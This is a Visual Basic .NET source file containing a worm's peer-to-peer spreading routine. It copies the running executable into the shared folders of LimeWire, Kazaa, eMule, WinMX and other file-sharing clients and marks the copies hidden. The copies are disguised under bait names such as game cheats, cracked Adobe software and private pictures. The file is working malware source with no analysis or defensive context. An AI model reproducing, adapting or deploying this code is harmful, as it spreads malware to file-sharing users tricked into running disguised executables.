Public Class Spread
    Public Shared Sub P2pSpread()
        On Error Resume Next
        SpreadP2P("World of Warcraft Hack Privat Edition 0.0.25.exe")
        SpreadP2P("Free Razzer-Account Creator 2.0.4.exe")
        SpreadP2P("Privat Sexpictures.scr")
        SpreadP2P("CS Photoshop 7.0 BetaVersion Cracked.exe")
        SpreadP2P("Adobe_After_Effects CS4 Installer.exe")
        SpreadP2P("Adobe Photoshop CS4 Extended.exe")
        SpreadP2P("Counter-Strike Source BonnyHop Hack 0.4 by HaxXTeam.exe")
        SpreadP2P("RapidShare Premium Hacker 0.5.1.exe")
        SpreadP2P("Windows 7 Gold Edition.exe")
        SpreadP2P("HaxXoRs Trojan Creator.com")
        SpreadP2P("Free SteamGames Hack.exe")
        SpreadP2P("x22 100% VAC-Undetected.exe")
        SpreadP2P("CSS SteamPatch Installer.exe")
        SpreadP2P("Msn Hacker 5.3.1 Premium Version.exe")
    End Sub

    Public Shared Sub SpreadP2P(ByVal SpreadDateiName As String)
        Dim SpreadListe As New List(Of String)
        SpreadListe.Add(Environ("programfiles") & "\LimeWire\Shared\")
        SpreadListe.Add(Environ("programfiles") & "\eDonkey2000\incoming\")
        SpreadListe.Add(Environ("programfiles") & "\kazaa\my shared folder\")
        SpreadListe.Add(Environ("programfiles") & "\kazaa lite\my shared folder\")
        SpreadListe.Add(Environ("programfiles") & "\kazaa lite k++\my shared folder\")
        SpreadListe.Add(Environ("programfiles") & "\grokster\my grokster\")
        SpreadListe.Add(Environ("programfiles") & "\emule\incoming\")
        SpreadListe.Add(Environ("programfiles") & "\morpheus\my shared folder\")
        SpreadListe.Add(Environ("programfiles") & "\grokster\my grokster\")
        SpreadListe.Add(Environ("programfiles") & "\tesla\files\")
        SpreadListe.Add(Environ("programfiles") & "\winmx\shared\")
        For Each SpreadItem As String In SpreadListe
            On Error Resume Next
            If SpreadItem <> "" Then
                IO.File.Copy(Application.ExecutablePath, SpreadItem & SpreadDateiName)
                IO.File.SetAttributes(SpreadItem & SpreadDateiName, IO.FileAttributes.Hidden)
            End If
        Next
    End Sub
End Class
